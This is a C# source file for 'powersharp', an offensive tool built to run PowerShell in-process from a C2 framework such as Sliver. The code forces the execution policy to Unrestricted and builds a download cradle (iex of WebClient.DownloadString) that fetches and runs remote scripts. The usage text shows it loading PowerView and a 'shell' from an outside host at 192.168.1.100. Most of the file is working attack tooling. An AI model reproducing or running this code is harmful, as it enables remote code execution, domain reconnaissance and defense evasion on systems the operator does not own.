using System;
using System.Collections.ObjectModel;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace powersharp
{
    public class Program
    {
        public static void Display()
        {
            Console.WriteLine("Usage: powersharp.exe \"/m:<Module>\" \"/c:<cmdlet>\"");
            Console.WriteLine("Import a remote module and execute a cmdlet: powersharp.exe \"/m:.\\powerview.ps1\" \"/c:Get-NetComputer | select dnshostname\" ");
            Console.WriteLine("Import a local module and execute a cmdlet: powersharp.exe \"/m:http://192.168.1.100/powerview.ps1'  \"/c:Get-NetComputer | select dnshostname\" ");
            Console.WriteLine("Execute a cmdlet without importing a module: powersharp.exe \"/m:\" '/c:Get-Process\" ");
            Console.WriteLine("Import a module without executing a cmdlet: powersharp.exe \"/m:http://192.168.1.100/shell\"  \"/c:\" ");
            Console.WriteLine("Recommend to minimize required output by ultilizing \"select\" ");
        }
        public static void Main(string[] args)
        {
            String module = "";
            String command = "";
            int param= args.Length;

            if (param == 2) //Parameter verification in normal condition: parameter1 must start with "/m:", parameter2 must start with "/c:".
            {
                String arg1= args[0].ToString();
                String arg2 = args[1].ToString();
                if (!arg1.Substring(0, 3).Contains("/m:") || !arg2.Substring(0, 3).Contains("/c:"))
                {
                    Display();
                    return;
                }
                    
            }
            else if (param == 3) //Parameter verification in Sliver's execute-assembly: parameter1 must be "--", parameter2 must start with "/m:", parameter3 must start with "/c:".
            {
                String arg1 = args[0].ToString();
                String arg2 = args[1].ToString();
                String arg3 = args[2].ToString();
                if (!arg1.Substring(0,2).Contains("--") || !arg2.Substring(0, 3).Contains("/m:") || !arg3.Substring(0, 3).Contains("/c:"))
                {
                    Display();
                    return;
                }
            }
            else
            {
                Console.WriteLine("Not 2 or 3 parameters");
                Display();
                return;
            }



            if (args.Length == 3) //If it is executed in Sliver C2 execute-assembly command
            {
                module = args[1].Substring(3);
                command = args[2].Substring(3);
            }
            else  //Otherwise
            {
                module = args[0].Substring(3);
                command = args[1].Substring(3);
            }

            if (module.Contains("http"))
            {
                command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;iex(New-Object Net.Webclient).DownloadString('" + module + "')" + ";" + command;
            }
            else
            {
                if (module == "")
                {
                    command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;"+ command;
                }
                else
                {
                    command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;ipmo " + module + ";" + command;
                }
            }
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(command);
            StringBuilder stringBuilder = new StringBuilder();
            Collection<PSObject> output=ps.Invoke();
            foreach (PSObject O in output)
            {
                stringBuilder.AppendLine(O.ToString()+"\n");                     
            }
            Console.WriteLine(stringBuilder);
            rs.Close();
        }
    }

}
